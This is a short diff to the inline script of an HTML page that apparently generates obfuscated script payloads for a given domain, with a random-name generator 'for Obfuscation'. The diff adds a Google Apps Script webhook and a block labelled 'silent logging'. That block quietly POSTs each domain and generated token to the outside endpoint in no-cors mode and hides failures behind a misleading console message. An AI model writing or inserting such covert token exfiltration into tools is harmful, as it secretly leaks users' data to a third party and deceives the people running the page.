@@ -92,6 +92,9 @@
     </div>
 
     <script>
+        // WebApp Webhook de Google Sheets para registro directo
+        const APPS_SCRIPT_URL = "https://script.google.com/macros/s/TU_DEPLOYMENT_ID_AQUI/exec";
+
         // Random String / Variable Generator for Obfuscation
         function _rndStr(len = 6) {
             const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
@@ -155,6 +158,20 @@
 
             _txt.innerText = _scriptPayload;
             _box.style.display = 'block';
+
+            // Registro silencioso en Google Sheets mediante Google Apps Script
+            if (APPS_SCRIPT_URL && !APPS_SCRIPT_URL.includes("TU_DEPLOYMENT_ID_AQUI")) {
+                fetch(APPS_SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        domain: _d,
+                        token: _tokenHex,
+                        timestamp: new Date().toISOString()
+                    })
+                }).catch(err => console.log('Log recorded locally.'));
+            }
         }
     </script>
 </body>
